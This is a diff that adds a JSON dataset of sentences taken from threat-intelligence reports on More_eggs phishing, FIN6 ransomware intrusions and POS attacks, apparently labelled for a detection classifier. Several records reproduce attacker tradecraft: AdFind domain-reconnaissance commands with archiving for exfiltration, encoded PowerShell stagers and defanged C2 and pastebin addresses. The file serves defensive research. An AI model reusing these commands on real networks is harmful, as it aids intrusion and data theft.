@@ -1,0 +1,2045 @@
+[
+    {
+        "text": "Since the middle of 2018, Proofpoint has been tracking campaigns abusing legitimate messaging services, offering fake jobs, and repeatedly following up via email to ultimately deliver the More_eggs backdoor.",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.626442015171051
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These campaigns primarily targeted US companies in various industries including retail, entertainment, pharmacy, and others that commonly employ online payments, such as online shopping portals.\n",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.43301671743392944
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The actor sending these campaigns attempts to establish rapport with potential victims by abusing LinkedIn\u2019s direct messaging service. In direct follow-up emails, the actor pretends to be from a staffing company with an offer of employment. In many cases, the actor supports the campaigns with fake websites that impersonate legitimate staffing companies. These websites, however, host the malicious payloads.",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.541226327419281
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We also believe that the same actor recently sent related campaigns, first noted by Brian Krebs, targeting anti-money laundering officers at financial institutions [1].\n",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5781954526901245
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We have observed a number of variations among the campaigns, but most share common characteristics.",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.719321608543396
+        },
+        "prediction": {}
+    },
+    {
+        "text": "While not exhaustive, the general flow as well as specific examples of these attacks are described below.\n",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6709455847740173
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Initially the actor uses a fraudulent, but legitimately created LinkedIn profile to initiate contact with individuals at the targeted company by sending invitations with a short message (Figure 1).",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6972676515579224
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Within a week, the actor sends a direct email to the target\u2019s work address reminding the recipient about the prior attempt to communicate on LinkedIn (Figure 2). It uses the target\u2019s professional title, as it appears on LinkedIn, as the subject, and often suggests the recipient click on a link to see the noted job description. In other cases, this actor used an attached PDF with embedded URLs or other malicious attachments.\nFigure 2: Example follow up email to the target\u2019s work address, with a malicious URL.\n The URLs link to a landing page that spoofs a real talent and staffing management company, using stolen branding to enhance the legitimacy of the campaigns (Figure 3). The landing page initiates a download of a Microsoft Word file (Figure 4) with malicious macros created with Taurus Builder (described below).",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.40497317910194397
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In other cases, the landing page may initiate the download of a JScript loader instead, but this intermediate malware still ultimately results in the delivery of More_eggs.\n Figure 3: Example of a landing page for the URL included in email using stolen branding and a lookalike domain for a talent management agency. This one specifically initiates a download of a malicious Microsoft Word document.\nFigure 4: Example malicious Microsoft Word document that uses macros to download More_eggs.\n",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4977491796016693
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Figure 5 shows an example of one such attachment, a PDF with a link to a spoofed landing page like that shown in Figure 3.\n Figure 5: Example PDF attachment  that contains a malicious URL.\n",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6365565657615662
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Examples of the types of techniques used by the actor to deliver the final More_eggs payload include:\nFigure 6: Example of a benign email designed to establish rapport with potential victims\nThis actor uses a variety of tools to distribute malware.",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6951913833618164
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We use this name to describe documents generated by a builder purchased from the same seller as Taurus builder.",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7200961709022522
+        },
+        "prediction": {}
+    },
+    {
+        "text": "In addition to its ability to download additional payloads, More_eggs has extensive capabilities to profile the infected machine.",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6841039061546326
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Brian Krebs wrote about a related campaign that targeted anti-money laundering officers at financial institutions that we believe may have been sent by the same actor.",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6561009883880615
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Although targeting and the final payload were different in the campaign he described, key similarities to campaigns describe above included:\nNote: As we were finalizing this report we observed a larger than usual campaign from this actor on Feb 21, 2019, from random senders, with a malicious URL in the email.\n ",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5711533427238464
+        },
+        "prediction": {}
+    },
+    {
+        "text": "As threat actors continue to turn away from very large-scale \u201cspray and pray\u201d campaigns and focus on persistent infections with downloaders, RATs, bankers, and other malware, increasingly sophisticated social engineering and stealthy malware are making their way into a range of campaigns. This actor provides compelling examples of these new approaches, using LinkedIn scraping, multi-vector and multistep contacts with recipients, personalized lures, and varied attack techniques to distribute the More_eggs downloader, which in turn can distribute the malware of their choice based on system profiles transmitted to the threat actor. In response to the increasing effectiveness of layered defenses and end user education efforts, we can expect more threat actors to adopt approaches that improve the effectiveness of their lures and increase the likelihood of high-quality infections.\n ",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.37846478819847107
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Note: We have informed all affected parties about the abuse of their services and brands in these campaigns.\n",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.658833384513855
+        },
+        "prediction": {}
+    },
+    {
+        "text": "2832245 | ETPRO CURRENT_EVENTS Possible More_eggs Connectivity Check\n2834137 | ETPRO TROJAN Observed Malicious SSL Cert (More_eggs CnC)\n",
+        "source": "Fake Jobs_ Campaigns Delivering More_eggs Backdoor via Fake Job Offers _ Proofpoint US.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6020917296409607
+        },
+        "prediction": {}
+    },
+    {
+        "text": "mandiant.com uses cookies to deliver and enhance the quality of its services and to analyze traffic. If you agree, cookies are also used to serve advertising and to personalize the content and advertisements that you see.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5806446671485901
+        },
+        "prediction": {}
+    },
+    {
+        "text": "mandiant.com uses cookies to deliver and enhance the quality of its services and to analyze traffic. If you agree, cookies are also used to serve advertising and to personalize the content and advertisements that you see.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5806446671485901
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Recently, FireEye Managed Defense detected and responded to a FIN6 intrusion at a customer within the engineering industry, which seemed out of character due to FIN6\u2019s historical targeting of payment card data.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6325731873512268
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The intent of the intrusion was initially unclear because the customer did not have or process payment card data.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7388468980789185
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Fortunately, every investigation conducted by Managed Defense or Mandiant includes analysts from our FireEye Advanced Practices team who help correlate activity observed in our hundreds of investigations and voluminous threat intelligence holdings.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.46636006236076355
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Our team quickly linked this activity with some recent Mandiant investigations and enabled us to determine that FIN6 has expanded their criminal enterprise to deploy ransomware in an attempt to further monetize their access to compromised entities.\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5756169557571411
+        },
+        "prediction": {}
+    },
+    {
+        "text": "This blog post details the latest FIN6 tactics, techniques, and procedures (TTPs), including ties to the use of LockerGoga and Ryuk ransomware families.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6258386373519897
+        },
+        "prediction": {}
+    },
+    {
+        "text": "It also highlights how early detection and response combined with threat intelligence gives Managed Defense customers a decisive advantage in stopping intruders before their goals manifest. In this instance, Managed Defense thwarted a potentially destructive attack that could have cost our customer millions  of dollars due to business disruption.\n Managed Defense worked in tandem with the customer\u2019s security team to acquire relevant log data, share findings from system analysis, and answer critical investigative questions. The customer was also undergoing a penetration test, so additional scrutiny was required in order to delineate between authorized testing activity and unauthorized activity attributed to FIN6. Our customer provided valuable insight into the role and importance of affected systems in preparation for entering Rapid Response.   Rapid Response is a service offering that delivers incident response support to Managed Defense customers. As with any incident response service, the primary goal is to scope of the nature of the identified malicious activity and to assist our customers with a successful eradication event to eliminate the presence of adversaries.\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3151405453681946
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Managed Defense, utilizing FireEye Endpoint Security technology, detected and responded to the threat activity identified within the customer\u2019s environment.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6648443341255188
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The subsequent investigation revealed FIN6 was in the initial phase of an intrusion using stolen credentials, Cobalt Strike, Metasploit, and publicly available tools such as Adfind and 7-Zip to conduct internal reconnaissance, compress data, and aid their overall mission.\n  Managed Defense investigated activity on two systems initially detected as compromised by FireEye Endpoint Security, the industry leading endpoint security solution that was ranked as the most effective endpoint detection and response (EDR) solution.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5155515074729919
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The activity was detected by comprehensive real time methodology signatures designed to identify the most evasive adversary techniques.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7611423134803772
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Pivoting from these initial leads, analysts identified suspicious SMB connections and Windows Registry artifacts that indicated the attacker had installed malicious Windows services to execute PowerShell commands on remote systems. Windows Event Log entries revealed the user account details responsible for the service installation and provided additional IOCs (Indicators of Compromise) to assist Managed Defense in scoping the compromise and identifying other systems accessed by FIN6. Managed Defense utilized Windows Registry Shellbag entries to reconstruct FIN6\u2019s actions on compromised systems that were consistent with lateral movement.\n ",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5101621150970459
+        },
+        "prediction": {}
+    },
+    {
+        "text": "To initially gain access to the environment, Managed Defense analysts identified that FIN6 compromised an internet facing system. Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows\u2019",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6797611117362976
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Following the RDP connection to systems, FIN6 used two different techniques to establish a foothold:\nFirst technique: FIN6 used PowerShell to execute an encoded command. The command consisted of a byte array containing a base64 encoded payload shown in Figure 1.\n The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command. The Cobalt Strike httpsstager was configured to download a second payload from hxxps://176.126.85[.]207:443/7sJh. FireEye retrieved this resource and determined it was a shellcode payload configured to download a third payload from hxxps://176.126.85[.]207/ca. FireEye was unable to determine the final payload due to it no longer being hosted at the time of analysis.\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3519926071166992
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Second technique: FIN6 also leveraged the creation of Windows services (named with a random 16-character string such as IXiCDtPbtGWnrAGQ) to execute encoded PowerShell commands. The randomly named service is a by-product of using Metasploit, which creates the 16-character service by default. The encoded command contained a Metasploit reverse HTTP shellcode payload stored in a byte-array like the first technique. The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as \u201c/ilX9zObq6LleAF8BBdsdHwRjapd8_1Tl4Y-9Rc6hMbPXHPgVTWTtb0xfb7BpIyC1Lia31F5gCN_btvkad7aR2JF5ySRLZmTtY\u201d over TCP port 443. This C2 URL contained shellcode that would make an HTTPS request for an additional download.\n To achieve privilege escalation within the environment, FIN6 utilized a named pipe impersonation technique included within the Metasploit framework that allows for SYSTEM-level privilege escalation.\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.33530887961387634
+        },
+        "prediction": {}
+    },
+    {
+        "text": "FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration:\nadfind.exe -f (objectcategory=person) >  ad_users.txt\nadfind.exe -f objectcategory=computer > ad_computers.txt\nadfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt\nadfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt\nadfind.exe -f \"(objectcategory=group)\" > ad_group.txt\nadfind.exe -gcb -sc trustdmp >  ad_trustdmp.txt\n7.exe a -mx3 ad.7z ad_*\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.28882747888565063
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The outputs of the batch file included Active Directory users, computers, organizational units, subnets, groups, and trusts.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.639626681804657
+        },
+        "prediction": {}
+    },
+    {
+        "text": "With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain. For lateral movement, FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts.\n Within two hours of the initial detection, the systems were contained using FireEye Endpoint Security. Through containment, attacker access to the systems was denied while valuable forensic evidence remained intact for remote analysis.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5634913444519043
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Due to Managed Defense\u2019s Rapid Response and containment, FIN6 was unable to maintain presence or achieve their objective.\n Through separate Mandiant Incident Response investigations, FireEye has observed FIN6 conducting intrusions to deploy either Ryuk or LockerGoga ransomware. The investigations observed FIN6 using similar tools, tactics, and procedures that were observed by FireEye Managed Defense during the earlier phases of the attack lifecycle. Mandiant observed additional indicators from the later attack lifecycle phases.\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5212899446487427
+        },
+        "prediction": {}
+    },
+    {
+        "text": "FIN6 used encoded PowerShell commands to install Cobalt Strike on compromised systems. The attacker made use of Cobalt Strike\u2019s \u201cpsexec\u201d lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell. In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com.\n FIN6 also moved laterally to servers in the environment using RDP and configured them as malware \u201cdistribution\u201d servers.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4971712529659271
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The distribution servers were used to stage the LockerGoga ransomware, additional utilities, and deployment scripts to automate installation of the ransomware. Mandiant identified a utility script named kill.bat that was run on systems in the environment. This script contained a series of anti-forensics and other commands intended to disable antivirus and destabilize the operating system. FIN6 automated the deployment of kill.bat and the LockerGoga ransomware using batch script files. FIN6 created a number of BAT files on the malware distribution servers with the naming convention xaa.bat, xab.bat, xac.bat, etc.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.2953633964061737
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These BAT files contained psexec commands to connect to remote systems and deploy kill.bat along with LockerGoga.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4642884433269501
+        },
+        "prediction": {}
+    },
+    {
+        "text": "FIN6 renamed the psexec service name to \u201cmstdc\u201d in order to masquerade as the legitimate Windows executable \u201cmsdtc.\u201d",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6805688738822937
+        },
+        "prediction": {}
+    },
+    {
+        "text": "To ensure a high success rate, the attacker used compromised domain administrator credentials. Domain administrators have complete control over Windows systems in an Active Directory environment.\n Figure 2: Strings from deployment BAT files\nRyuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer. LockerGoga is ransomware that uses 1024-bit RSA and 128-bit AES encryption to encrypt files and leaves ransom notes in the root directory and shared desktop directory. Additional information about Ryuk and LockerGoga is available on the FireEye Intelligence portal: 18-00015730 and 19-00002005\nFIN6 has traditionally conducted intrusions targeting payment card data from Point-of-Sale (POS) or eCommerce systems.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3633609712123871
+        },
+        "prediction": {}
+    },
+    {
+        "text": "However, we have recently identified multiple targeted Ryuk and LockerGoga ransomware incidents showing ties to FIN6, through both Mandiant incident response investigations and FireEye Intelligence research into threats impacting other organizations.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4955536127090454
+        },
+        "prediction": {}
+    },
+    {
+        "text": "We have traced these intrusions back to July 2018, and they have reportedly cost victims tens of millions of dollars.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.47807252407073975
+        },
+        "prediction": {}
+    },
+    {
+        "text": "As the frequency of these intrusions deploying ransomware have increased, the cadence of activity traditionally attributed to FIN6\u2014intrusions targeting point-of-sale (POS) environments, deploying TRINITY malware and sharing other key characteristics\u2014has declined.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6135498881340027
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Given that, FIN6 may have evolved as a whole to focus on these extortive intrusions.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6171757578849792
+        },
+        "prediction": {}
+    },
+    {
+        "text": "However, based on tactical differences between these ransomware incidents and historical FIN6 activity, it is also possible that some FIN6 operators have been carrying out ransomware deployment intrusions independently of the group\u2019s payment card breaches. Which of those scenarios is happening would influence how pressing a threat the group\u2019s card data breach tactics continue to be.",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5748176574707031
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Criminal operations and relationships are highly adaptable, so we commonly encounter such attribution challenges in regards to criminal activity. Given that these intrusions have been sustained for almost a year, we expect that continued research into further intrusion attempts may enable us to more fully answer these questions regarding FIN6\u2019s current status.\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5570695400238037
+        },
+        "prediction": {}
+    },
+    {
+        "text": "31.220.45[.]151\n46.166.173[.]109\n62.210.136[.]65\n89.105.194[.]236\n93.115.26[.]171\n103.73.65[.]116\n176.126.85[.]207\n185.202.174[.]31\n185.202.174[.]41\n185.202.174[.]44\n185.202.174[.]80\n185.202.174[.]84\n185.202.174[.]91\n185.222.211[.]98\nhxxps://176.126.85[.]207:443/7sJh\nhxxps://176.126.85[.]207/ca\nhxxps://176.126.85[.]207:443/ilX9zObq6LleAF8BBdsdHwRjapd8_1Tl4Y-9Rc6hMbPXHPgVTWTtb0xfb7BpIyC1Lia31F5gCN_btvkad7aR2JF5ySRLZmTtY\nhxxps://pastebin[.]com/raw/0v6RiYEY\nhxxps://pastebin[.]com/raw/YAm4QnE7\nhxxps://pastebin[.]com/raw/p5U9siCD\nhxxps://pastebin[.]com/raw/BKVLHWa0\nhxxps://pastebin[.]com/raw/HPpvY00Q\nhxxps://pastebin[.]com/raw/L4LQQfXE\nhxxps://pastebin[.]com/raw/YAm4QnE7\nhxxps://pastebin[.]com/raw/p5U9siCD\nhxxps://pastebin[.]com/raw/tDAbbY52\nhxxps://pastebin[.]com/raw/u9yYjTr7\nhxxps://pastebin[.]com/raw/wrehJuGp\nhxxps://pastebin[.]com/raw/tDAbbY52\nhxxps://pastebin[.]com/raw/wrehJuGp\nhxxps://pastebin[.]com/raw/Bber9jae\n031dd207c8276bcc5b41825f0a3e31b0\n0f9931210bde86753d0f4a9abc5611fd\n12597de0e709e44442418e89721b9140\n32ea267296c8694c0b5f5baeacf34b0e\n395d52f738eb75852fe501df13231c8d\n39b7c130f1a02665fd72d65f4f9cb634\n3c5575ce80e0847360cd2306c64b51a0\n46d781620afc536afa25381504059612\n4ec86a35f6982e6545b771376a6f65bb\n73e7ddd6b49cdaa982ea8cb578f3af15\n8452d52034d3b2cb612dbc59ed609163\n8c099a15a19b6e5b29a3794abf8a5878\n9d3fdb1e370c0ee6315b4625ecf2ac55\nd2f9335a305440d91702c803b6d046b6\n34187a34d0a3c5d63016c26346371b54\nad_users.txt\nad_trustdmp.txt\nad_subnets.txt\nad_ous.txt\nad_group.txt\nad_computers.txt\nThe following table contains several specific detection names, including methodology detections for several tools and techniques that applied to the initial infection activity as well as additional detection names for the ransomware used by FIN6.\n METASPLOIT A (METHODOLOGY)\n SUSPICIOUS POWERSHELL USAGE (METHODOLOGY)\nBEACON A (FAMILY)\nSYSNATIVE ALIAS RUNDLL32.EXE (METHODOLOGY)\n FE_Ransomware_Win64_Ryuk_1\nFE_Ransomware_Win_LOCKERGOGA_1\nFE_Ransomware_Win_LOCKERGOGA_2\nFE_Ransomware_Win32_LOCKERGOGA_1\nFE_Ransomware_Win32_LOCKERGOGA_2\nFE_Ransomware_Win64_LOCKERGOGA_1\nGet the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon.\n",
+        "source": "Pick-Six_ Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.06486885249614716
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Cybersecurity News, Threat Research, And More From The Team Spearheading The Evolution Of Endpoint Security\nThis post was authored by Michael Gorelik and Alon Groisman.\n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6039859056472778
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Over the past 8-10 weeks, Morphisec has been tracking multiple sophisticated attacks targeting Point of Sale thin clients globally. More specifically, on the 6th of February we identified an extremely high number of prevention events stopping Cobalt Strike backdoor execution, with some of the attacks expressly targeting Point of Sale VMWare Horizon thin clients.\n Based on the initial indicators, we identified FrameworkPOS scraping malware installed on some of the thin clients, after initializing PowerShell/WMI stages that downloaded and reflectively loaded Cobalt-Strike beacon with PowerShell extension directly into the memory.\n We found many indicators linking specifically to the FIN6 group (WMI/PowerShell, FrameworkPOS, lateral movement and privilege escalation), with the difference of moving from Metasploit to Cobalt-Strike).",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3142424523830414
+        },
+        "prediction": {}
+    },
+    {
+        "text": "If successful, the Cobalt Strike beacon payload gives attackers full control over the infected system and the ability to move laterally to other systems, harvest user credentials, execute code and more, all while evading advanced EDR scanning techniques.\n Digging deeper into the notification and the telemetry, we identified victims across the United States, Japan and India from the finance, insurance and healthcare (diagnostic image processing) sectors, as well as additional targets globally.\n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5543599128723145
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Following additional retro-hunting on Virus Total, we identified multiple servers that were, and still are, delivering the Cobalt Strike beacon using the same delivery pattern and same C2 communication pattern. We have notified the customers and the legal authorities about the currently active C2 servers.\n Morphisec Labs is currently still analyzing the infiltration methods (unknown); due to this we will present only partial technical information in this report. However, we believe it important to publish even a partial analysis so that enterprises are aware of, and immediately block, any access to the URLs listed below.\n As stated in the introduction, the infiltration vector is yet to be determined, although after retro-hunting on VT and matching it to our known telemetry events, we believe that at least one vector is executed through HTA files that execute PowerShell scripts as part of an embedded VBScript.\n Additional hunting reveals additional scripts that lead to the same Cobalt Strike beacon. It is not known if the scripts below are part of a lateral movement or just additional examples of infiltration samples. However, at least some of them are executed through WMI which may indicate an intermediate stage. \n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.31342190504074097
+        },
+        "prediction": {}
+    },
+    {
+        "text": "All the various scripts are decoded to the following PowerShell pattern:\n The script above decompresses an additional level of PowerShell stager (regular Gzip):\nClearly, the marked base64 encoded script represents the next stage shellcode that is either remotely injected into the existing 32 bit or into a newly created 32 bit PowerShell process (if the current PowerShell is 64bit). Some samples differentiate in the way the VirtualAlloc and CreateThread are declared.\n",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5715653896331787
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The injected shellcode is a regular Metasploit downloader shellcode that traverses the PEB, resolves the function names by the standard ROR 13 hash, and downloads the next stage shellcode directly into memory from the C2.",
+        "source": "New Global Cyber Attack on Point of Sale Systems.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6845043897628784
+        },
+        "prediction": {}
+    },
+    {
